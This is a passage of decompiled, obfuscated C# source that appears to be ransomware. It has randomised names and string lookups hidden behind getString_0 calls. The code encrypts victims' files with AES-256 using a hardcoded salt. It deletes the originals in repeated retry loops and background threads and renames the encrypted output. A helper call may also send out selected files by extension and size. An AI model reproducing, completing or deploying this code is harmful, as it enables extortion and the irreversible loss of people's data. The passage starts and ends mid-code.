											File.AppendAllText(AJkkstCArH, ZrUPQFEbZMm.getString_0(107390760) + CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + ZrUPQFEbZMm.getString_0(107391006) + ex6.Message + ZrUPQFEbZMm.getString_0(107396262));
										}
										catch (Exception)
										{
										}
									}
									LuhgDZXWifkSE++;
									return;
								}
							}
						}
						else if (!NHbEtBQcjaHtXtG)
						{
							if (!lPNPDgvBRE)
							{
								DZFNNITCWrKC(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + ZrUPQFEbZMm.getString_0(107391015), baXqehWULBIGBE);
							}
							else
							{
								DZFNNITCWrKC(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + ZrUPQFEbZMm.getString_0(107391015), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!lPNPDgvBRE)
								{
									XozvpxrYexO(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, baXqehWULBIGBE);
								}
								else
								{
									XozvpxrYexO(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (IyKNhTqRuk)
								{
									try
									{
										File.AppendAllText(AJkkstCArH, ZrUPQFEbZMm.getString_0(107390760) + CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + ZrUPQFEbZMm.getString_0(107391006) + ex8.Message + ZrUPQFEbZMm.getString_0(107396262));
									}
									catch (Exception)
									{
									}
								}
								LuhgDZXWifkSE++;
								return;
							}
						}
						if (lPNPDgvBRE)
						{
							if (CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ != ZrUPQFEbZMm.getString_0(107391020))
							{
								lbMOCvnhGJaBCrXH(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ, bytes2);
							}
							else
							{
								lbMOCvnhGJaBCrXH(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			CS_0024_003C_003E8__locals0.nuiJQynaikoWe.Remove(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB);
		});
	}

	private static void TrxZGVhzMIPrad(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (LZOxaUWpmIj == getString_0(107396931))
					{
						foreach (string item in izJuaPEIDwBM)
						{
							if (string_0.ToLower().EndsWith(item) && IxktWyCSAKdLJt == getString_0(107396931))
							{
								if (Convert.ToInt32(kyMVozVHGsuV) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										pkkGXNrkowS.XVoGcXcserch(getString_0(107393483), getString_0(107393478), getString_0(107393433), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && IxktWyCSAKdLJt == getString_0(107396936))
							{
								try
								{
									pkkGXNrkowS.XVoGcXcserch(getString_0(107393483), getString_0(107393478), getString_0(107393433), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107390998)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107390998), getString_0(107392858)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void XozvpxrYexO(string string_0, string string_1, byte[] byte_0)
	{
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		if (LZOxaUWpmIj == getString_0(107396931))
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in izJuaPEIDwBM)
			{
				if (string_0.ToLower().EndsWith(item) && IxktWyCSAKdLJt == getString_0(107396931))
				{
					if (Convert.ToInt32(kyMVozVHGsuV) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							pkkGXNrkowS.XVoGcXcserch(getString_0(107393483), getString_0(107393478), getString_0(107393433), string_0);
						}
						catch
						{
						}
					}
				}
				else if (string_0.ToLower().EndsWith(item) && IxktWyCSAKdLJt == getString_0(107396936))
				{
					try
					{
						pkkGXNrkowS.XVoGcXcserch(getString_0(107393483), getString_0(107393478), getString_0(107393433), string_0);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = JMNtsrAVumpK.xvIWmLmXVwDAe(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		UOSpFwBdRnM++;
	}

	private static void DZFNNITCWrKC(string string_0, string string_1, byte[] byte_0)
	{
		zSedGxXyDlWpe CS_0024_003C_003E8__locals0 = new zSedGxXyDlWpe();
		CS_0024_003C_003E8__locals0.UsQJhhXoKCoNs = string_0;
		CS_0024_003C_003E8__locals0.ugLXUrkSgjk = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string ugLXUrkSgjk = CS_0024_003C_003E8__locals0.ugLXUrkSgjk;
			FileStream fileStream = new FileStream(ugLXUrkSgjk, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (hEPyWDyzsMB == getString_0(107396931))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.UsQJhhXoKCoNs, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.UsQJhhXoKCoNs, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.UsQJhhXoKCoNs, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.ugLXUrkSgjk.Length > 0)
				{
					if (LZOxaUWpmIj == getString_0(107396931))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.UsQJhhXoKCoNs, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in izJuaPEIDwBM)
						{
							if (CS_0024_003C_003E8__locals0.UsQJhhXoKCoNs.ToLower().EndsWith(item) && IxktWyCSAKdLJt == getString_0(107396931))
							{
								if (Convert.ToInt32(kyMVozVHGsuV) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										pkkGXNrkowS.XVoGcXcserch(getString_0(107393483), getString_0(107393478), getString_0(107393433), CS_0024_003C_003E8__locals0.UsQJhhXoKCoNs);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.UsQJhhXoKCoNs.ToLower().EndsWith(item) && IxktWyCSAKdLJt == getString_0(107396936))
							{
								try
								{
									pkkGXNrkowS.XVoGcXcserch(getString_0(107393483), getString_0(107393478), getString_0(107393433), CS_0024_003C_003E8__locals0.UsQJhhXoKCoNs);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.UsQJhhXoKCoNs);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.ugLXUrkSgjk.EndsWith(getString_0(107390998)))
					{
						File.Move(CS_0024_003C_003E8__locals0.ugLXUrkSgjk, CS_0024_003C_003E8__locals0.ugLXUrkSgjk.Replace(getString_0(107390998), getString_0(107392858)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.ugLXUrkSgjk))
							{
								File.Delete(CS_0024_003C_003E8__locals0.ugLXUrkSgjk);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (IyKNhTqRuk)
			{
				try
				{
					File.AppendAllText(AJkkstCArH, getString_0(107390743) + CS_0024_003C_003E8__locals0.UsQJhhXoKCoNs + getString_0(107390989) + ex2.Message + getString_0(107396245));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> wjOvnLHSLKhV = WjOvnLHSLKhV;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				fMeAFAnEJct(getString_0(107390936), string_0);
			};
		}
		Parallel.ForEach(wjOvnLHSLKhV, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		List<string> wWPgOUxUtifS = WWPgOUxUtifS;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				fMeAFAnEJct(getString_0(107390927), string_0);
			};
		}
		Parallel.ForEach(wWPgOUxUtifS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> zSYMvlDWxYEtJZO = ZSYMvlDWxYEtJZO;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107390946)), string_0);
			};
		}
		Parallel.ForEach(zSYMvlDWxYEtJZO, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		if (jDqdPPwKfsddQK == getString_0(107396931))
		{
			string[] source = neDnepJoXuKRz;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
				{
					fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107390946)), getString_0(107390921) + string_0 + getString_0(107390912));
				};
			}
			Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		}
		if (!NvfCSlJqoNa().Contains(getString_0(107390609)))
		{
			TYQBnJQaPlD(LABFsmtCCegTkuJ);
		}
		else
		{
			List<string> source2 = bverOuZzCjzkYh;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					fMeAFAnEJct(KPabEeiJZVewrU(ITFOBjLBjn(getString_0(107390875))), string_0);
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		List<string> source3 = cIDpbJJYzpDACkyZ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
			{
				fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107390882)), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		List<string> source4 = zziMgJgWEnmo;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				fMeAFAnEJct(getString_0(107390833), string_0);
			};
		}
		Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		fMeAFAnEJct(getString_0(107390936), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		fMeAFAnEJct(getString_0(107390927), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107390946)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107390946)), getString_0(107390921) + string_0 + getString_0(107390912));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		fMeAFAnEJct(KPabEeiJZVewrU(ITFOBjLBjn(getString_0(107390875))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		fMeAFAnEJct(KPabEeiJZVewrU(getString_0(107390882)), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		fMeAFAnEJct(getString_0(107390833), string_0);
	}

	static dVGeYGcQgLS()
	{
		Strings.CreateGetStringDelegate(typeof(dVGeYGcQgLS));
		bYxBeUFQrvjc = getString_0(107392834);
		baXqehWULBIGBE = null;
		MDZDXHRjkgrJzWk = getString_0(107396936);
		RECKTQkVejAGfc = getString_0(107390856);
		SRFEGlkoeiER = new List<string>();
		wfSQRNJNpIsCV = new List<string>();
		gETRgNgBKYX = getString_0(107396936);
		zVrwuHAUxLyay = getString_0(107392858);
		tjcGwWrURUFJ = getString_0(107392858);
		eBqVrsmuLSGvlL = getString_0(107396936);
		KYeUqtAhrujU = 0;
		peJAFtAqyTg = getString_0(107396936);
		ugDAsDtkIuFHI = getString_0(107396936);
		sermcGnhtRVId = getString_0(107396936);
		wgVMZrFOOvZlc = getString_0(107390299);
		ecaBMUkRPghLrn = getString_0(107396936);
		RmvrrDiHwaeP = getString_0(107396936);
		XTrbCENWNoq = getString_0(107396936);
		rwgmXYownudC = getString_0(107396936);
		PtQdinOAWGzwYsV = new List<string>
		{
			KPabEeiJZVewrU(getString_0(107390294)),
			KPabEeiJZVewrU(getString_0(107390309)),
			KPabEeiJZVewrU(getString_0(107390252)),
			KPabEeiJZVewrU(getString_0(107390235)),
			KPabEeiJZVewrU(getString_0(107390242)),
			KPabEeiJZVewrU(getString_0(107390217)),
			KPabEeiJZVewrU(getString_0(107390168)),
			KPabEeiJZVewrU(getString_0(107390175)),
			KPabEeiJZVewrU(getString_0(107390150)),
			KPabEeiJZVewrU(getString_0(107390093)),
			KPabEeiJZVewrU(getString_0(107390108)),
			KPabEeiJZVewrU(getString_0(107390083)),
			KPabEeiJZVewrU(getString_0(107390570))
		};
		eWoKDGBNuJT = new List<string>();
		JGbxJAwTqf = getString_0(107396936);
		YrItydhffRwf = getString_0(107396936);
		VEHjAqFVZrQcijAI = getString_0(107396936);
		faYAKmARedHa = new List<string>();
		DOzTZyFxEotdrJ = getString_0(107396936);
		wQjfgLhqCXKC = getString_0(107390513);
		uJRCtLGzhdwU = getString_0(107396936);
		iCwSUTiSSBL = getString_0(107396936);
		WWPgOUxUtifS = new List<string>
		{
			KPabEeiJZVewrU(getString_0(107390496)),
			KPabEeiJZVewrU(getString_0(107390463)),
			KPabEeiJZVewrU(getString_0(107390430)),
			KPabEeiJZVewrU(getString_0(107390397)),
			KPabEeiJZVewrU(getString_0(107390364)),
			KPabEeiJZVewrU(getString_0(107390335)),
			KPabEeiJZVewrU(getString_0(107389766)),
			KPabEeiJZVewrU(getString_0(107389737)),
			KPabEeiJZVewrU(getString_0(107389692)),
			KPabEeiJZVewrU(getString_0(107389595)),
			KPabEeiJZVewrU(getString_0(107389562)),
			KPabEeiJZVewrU(getString_0(107390041)),
			KPabEeiJZVewrU(getString_0(107390008)),
			KPabEeiJZVewrU(getString_0(107389979)),
			KPabEeiJZVewrU(getString_0(107389982)),
			KPabEeiJZVewrU(getString_0(107389909)),
			KPabEeiJZVewrU(getString_0(107389868)),
			KPabEeiJZVewrU(getString_0(107389811)),
			KPabEeiJZVewrU(getString_0(107389282)),
			KPabEeiJZVewrU(getString_0(107389249)),
			KPabEeiJZVewrU(getString_0(107389220)),
			KPabEeiJZVewrU(getString_0(107389147)),
			KPabEeiJZVewrU(getString_0(107389106)),
			KPabEeiJZVewrU(getString_0(107389073)),
			KPabEeiJZVewrU(getString_0(107389056)),
			KPabEeiJZVewrU(getString_0(107389511)),
			KPabEeiJZVewrU(getString_0(107389470)),
			KPabEeiJZVewrU(getString_0(107389441)),
			KPabEeiJZVewrU(getString_0(107389368)),
			KPabEeiJZVewrU(getString_0(107389343)),
			KPabEeiJZVewrU(getString_0(107388766)),
			KPabEeiJZVewrU(getString_0(107388709)),
			KPabEeiJZVewrU(getString_0(107388644)),
			KPabEeiJZVewrU(getString_0(107388563)),
			KPabEeiJZVewrU(getString_0(107389010)),
			KPabEeiJZVewrU(getString_0(107388953)),
			KPabEeiJZVewrU(getString_0(107388920)),
			KPabEeiJZVewrU(getString_0(107388879)),
			KPabEeiJZVewrU(getString_0(107388870)),
			KPabEeiJZVewrU(getString_0(107388793)),
			KPabEeiJZVewrU(getString_0(107388796)),
			KPabEeiJZVewrU(getString_0(107388187)),
			KPabEeiJZVewrU(getString_0(107388146)),
			KPabEeiJZVewrU(getString_0(107388113)),
			KPabEeiJZVewrU(getString_0(107388104)),
			KPabEeiJZVewrU(getString_0(107388023)),
			KPabEeiJZVewrU(getString_0(107388522)),
			KPabEeiJZVewrU(getString_0(107388449)),
			KPabEeiJZVewrU(getString_0(107388372)),
			KPabEeiJZVewrU(getString_0(107388359)),
			KPabEeiJZVewrU(getString_0(107388282)),
			KPabEeiJZVewrU(getString_0(107387729)),
			KPabEeiJZVewrU(getString_0(107387688)),
			KPabEeiJZVewrU(getString_0(107387659)),
			KPabEeiJZVewrU(getString_0(107387618)),
			KPabEeiJZVewrU(getString_0(107387553)),
			KPabEeiJZVewrU(getString_0(107387988)),
			KPabEeiJZVewrU(getString_0(107387959)),
			KPabEeiJZVewrU(getString_0(107387946)),
			KPabEeiJZVewrU(getString_0(107387881)),
			KPabEeiJZVewrU(getString_0(107387820)),
			KPabEeiJZVewrU(getString_0(107387763)),
			KPabEeiJZVewrU(getString_0(107387186)),
			KPabEeiJZVewrU(getString_0(107387177)),
			KPabEeiJZVewrU(getString_0(107387116)),
			KPabEeiJZVewrU(getString_0(107387107)),
			KPabEeiJZVewrU(getString_0(107386994)),
			KPabEeiJZVewrU(getString_0(107387445)),
			KPabEeiJZVewrU(getString_0(107387372)),
			KPabEeiJZVewrU(getString_0(107387359)),
			KPabEeiJZVewrU(getString_0(107387326)),
			KPabEeiJZVewrU(getString_0(107387253)),
			KPabEeiJZVewrU(getString_0(107386696)),
			KPabEeiJZVewrU(getString_0(107386619)),
			KPabEeiJZVewrU(getString_0(107386562)),
			KPabEeiJZVewrU(getString_0(107386481)),
			KPabEeiJZVewrU(getString_0(107386964)),
			KPabEeiJZVewrU(getString_0(107386955)),
			KPabEeiJZVewrU(getString_0(107386890)),
			KPabEeiJZVewrU(getString_0(107386809)),
			KPabEeiJZVewrU(getString_0(107386784)),
			KPabEeiJZVewrU(getString_0(107386751)),
			KPabEeiJZVewrU(getString_0(107386178)),
			KPabEeiJZVewrU(getString_0(107386121)),
			KPabEeiJZVewrU(getString_0(107388953)),
			KPabEeiJZVewrU(getString_0(107386032)),
			KPabEeiJZVewrU(getString_0(107386023)),
			KPabEeiJZVewrU(getString_0(107386414)),
			KPabEeiJZVewrU(getString_0(107386401)),
			KPabEeiJZVewrU(getString_0(107386340)),
			KPabEeiJZVewrU(getString_0(107386315)),
			KPabEeiJZVewrU(getString_0(107386270)),
			KPabEeiJZVewrU(getString_0(107385677)),
			KPabEeiJZVewrU(getString_0(107389343)),
			KPabEeiJZVewrU(getString_0(107385612)),
			KPabEeiJZVewrU(getString_0(107385603)),
			KPabEeiJZVewrU(getString_0(107385546)),
			KPabEeiJZVewrU(getString_0(107388766)),
			KPabEeiJZVewrU(getString_0(107385473)),
			KPabEeiJZVewrU(getString_0(107385904)),
			KPabEeiJZVewrU(getString_0(107385815)),
			KPabEeiJZVewrU(getString_0(107385750)),
			KPabEeiJZVewrU(getString_0(107385733)),
			KPabEeiJZVewrU(getString_0(107388644)),
			KPabEeiJZVewrU(getString_0(107385112)),
			KPabEeiJZVewrU(getString_0(107388920)),
			KPabEeiJZVewrU(getString_0(107388563)),
			KPabEeiJZVewrU(getString_0(107385079)),
			KPabEeiJZVewrU(getString_0(107385054)),
			KPabEeiJZVewrU(getString_0(107389010)),
			KPabEeiJZVewrU(getString_0(107385021)),
			KPabEeiJZVewrU(getString_0(107384940)),
			KPabEeiJZVewrU(getString_0(107385403)),
			KPabEeiJZVewrU(getString_0(107389368)),
			KPabEeiJZVewrU(getString_0(107385410)),
			KPabEeiJZVewrU(getString_0(107385333)),
			KPabEeiJZVewrU(getString_0(107385304)),
			KPabEeiJZVewrU(getString_0(107385275)),
			KPabEeiJZVewrU(getString_0(107385230)),
			KPabEeiJZVewrU(getString_0(107385197)),
			KPabEeiJZVewrU(getString_0(107384660)),
			KPabEeiJZVewrU(getString_0(107384647)),
			KPabEeiJZVewrU(getString_0(107384590)),
			KPabEeiJZVewrU(getString_0(107384581)),
			KPabEeiJZVewrU(getString_0(107384504)),
			KPabEeiJZVewrU(getString_0(107384487)),
			KPabEeiJZVewrU(getString_0(107384910)),
			KPabEeiJZVewrU(getString_0(107384877)),
			KPabEeiJZVewrU(getString_0(107384864)),
			KPabEeiJZVewrU(getString_0(107384831)),
			KPabEeiJZVewrU(getString_0(107384758)),
			KPabEeiJZVewrU(getString_0(107389441)),
			KPabEeiJZVewrU(getString_0(107384487)),
			KPabEeiJZVewrU(getString_0(107384717)),
			KPabEeiJZVewrU(getString_0(107384688)),
			KPabEeiJZVewrU(getString_0(107384147)),
			KPabEeiJZVewrU(getString_0(107384130)),
			KPabEeiJZVewrU(getString_0(107384057)),
			KPabEeiJZVewrU(getString_0(107384028)),
			KPabEeiJZVewrU(getString_0(107383923)),
			KPabEeiJZVewrU(getString_0(107384406)),
			KPabEeiJZVewrU(getString_0(107384373)),
			KPabEeiJZVewrU(getString_0(107384300)),
			KPabEeiJZVewrU(getString_0(107384271)),
			KPabEeiJZVewrU(getString_0(107384258)),
			KPabEeiJZVewrU(getString_0(107384193)),
			KPabEeiJZVewrU(getString_0(107383648)),
			KPabEeiJZVewrU(getString_0(107383571)),
			KPabEeiJZVewrU(getString_0(107383510)),
			KPabEeiJZVewrU(getString_0(107383477)),
			KPabEeiJZVewrU(getString_0(107383464)),
			KPabEeiJZVewrU(getString_0(107383911)),
			KPabEeiJZVewrU(getString_0(107383878)),
			KPabEeiJZVewrU(getString_0(107383837)),
			KPabEeiJZVewrU(getString_0(107383756)),
			KPabEeiJZVewrU(getString_0(107389056)),
			KPabEeiJZVewrU(getString_0(107383727)),
			KPabEeiJZVewrU(getString_0(107383670)),
			KPabEeiJZVewrU(getString_0(107383117)),
			KPabEeiJZVewrU(getString_0(107383104)),
			KPabEeiJZVewrU(getString_0(107383031)),
			KPabEeiJZVewrU(getString_0(107383018)),
			KPabEeiJZVewrU(getString_0(107382925)),
			KPabEeiJZVewrU(getString_0(107382908)),
			KPabEeiJZVewrU(getString_0(107383371)),
			KPabEeiJZVewrU(getString_0(107383282)),
			KPabEeiJZVewrU(getString_0(107383225)),
			KPabEeiJZVewrU(getString_0(107383180)),
			KPabEeiJZVewrU(getString_0(107383171)),
			KPabEeiJZVewrU(getString_0(107382602)),
			KPabEeiJZVewrU(getString_0(107389511)),
			KPabEeiJZVewrU(getString_0(107382529)),
			KPabEeiJZVewrU(getString_0(107382500)),
			KPabEeiJZVewrU(getString_0(107382467)),
			KPabEeiJZVewrU(getString_0(107382394)),
			KPabEeiJZVewrU(getString_0(107382397)),
			KPabEeiJZVewrU(getString_0(107389073)),
			KPabEeiJZVewrU(getString_0(107382836)),
			KPabEeiJZVewrU(getString_0(107382819)),
			KPabEeiJZVewrU(getString_0(107382790)),
			KPabEeiJZVewrU(getString_0(107387820)),
			KPabEeiJZVewrU(getString_0(107382757)),
			KPabEeiJZVewrU(getString_0(107382790)),
			KPabEeiJZVewrU(getString_0(107382728)),
			KPabEeiJZVewrU(getString_0(107382699)),
			KPabEeiJZVewrU(getString_0(107382638)),
			KPabEeiJZVewrU(getString_0(107382109)),
			KPabEeiJZVewrU(getString_0(107382028)),
			KPabEeiJZVewrU(getString_0(107382019)),
			KPabEeiJZVewrU(getString_0(107381958)),
			KPabEeiJZVewrU(getString_0(107381929)),
			KPabEeiJZVewrU(getString_0(107381888)),
			KPabEeiJZVewrU(getString_0(107382323)),
			KPabEeiJZVewrU(getString_0(107382310)),
			KPabEeiJZVewrU(getString_0(107382277)),
			KPabEeiJZVewrU(getString_0(107382188)),
			KPabEeiJZVewrU(getString_0(107382175)),
			KPabEeiJZVewrU(getString_0(107381606)),
			KPabEeiJZVewrU(getString_0(107381573)),
			KPabEeiJZVewrU(getString_0(107381532)),
			KPabEeiJZVewrU(getString_0(107381503)),
			KPabEeiJZVewrU(getString_0(107381442)),
			KPabEeiJZVewrU(getString_0(107381409)),
			KPabEeiJZVewrU(getString_0(107381864)),
			KPabEeiJZVewrU(getString_0(107381823)),
			KPabEeiJZVewrU(getString_0(107381742)),
			KPabEeiJZVewrU(getString_0(107381709)),
			KPabEeiJZVewrU(getString_0(107381692)),
			KPabEeiJZVewrU(getString_0(107381615)),
			KPabEeiJZVewrU(getString_0(107381086)),
			KPabEeiJZVewrU(getString_0(107381009)),
			KPabEeiJZVewrU(getString_0(107380992)),
			KPabEeiJZVewrU(getString_0(107380959)),
			KPabEeiJZVewrU(getString_0(107380886)),
			KPabEeiJZVewrU(getString_0(107380845)),
			KPabEeiJZVewrU(getString_0(107381344)),
			KPabEeiJZVewrU(getString_0(107384057)),
			KPabEeiJZVewrU(getString_0(107381311)),
			KPabEeiJZVewrU(getString_0(107381238)),
			KPabEeiJZVewrU(getString_0(107381213)),
			KPabEeiJZVewrU(getString_0(107381184)),
			KPabEeiJZVewrU(getString_0(107381151)),
			KPabEeiJZVewrU(getString_0(107381118)),
			KPabEeiJZVewrU(getString_0(107413293)),
			KPabEeiJZVewrU(getString_0(107413264)),
			KPabEeiJZVewrU(getString_0(107413251)),
			KPabEeiJZVewrU(getString_0(107413174)),
			KPabEeiJZVewrU(getString_0(107413133)),
			KPabEeiJZVewrU(getString_0(107413588)),
			KPabEeiJZVewrU(getString_0(107413571)),
			KPabEeiJZVewrU(getString_0(107413542)),
			KPabEeiJZVewrU(getString_0(107413465))
		};
		WjOvnLHSLKhV = new List<string>
		{
			KPabEeiJZVewrU(getString_0(107413424)),
			KPabEeiJZVewrU(getString_0(107413407)),
			KPabEeiJZVewrU(getString_0(107412814)),
			KPabEeiJZVewrU(getString_0(107412797)),
			KPabEeiJZVewrU(getString_0(107412716)),
			KPabEeiJZVewrU(getString_0(107412683)),
			KPabEeiJZVewrU(getString_0(107412606)),
			KPabEeiJZVewrU(getString_0(107413057))
		};
		ZSYMvlDWxYEtJZO = new List<string>
		{
			KPabEeiJZVewrU(getString_0(107413000)),
			KPabEeiJZVewrU(getString_0(107412967)),
			KPabEeiJZVewrU(getString_0(107412890)),
			KPabEeiJZVewrU(getString_0(107412873)),
			KPabEeiJZVewrU(getString_0(107412328)),
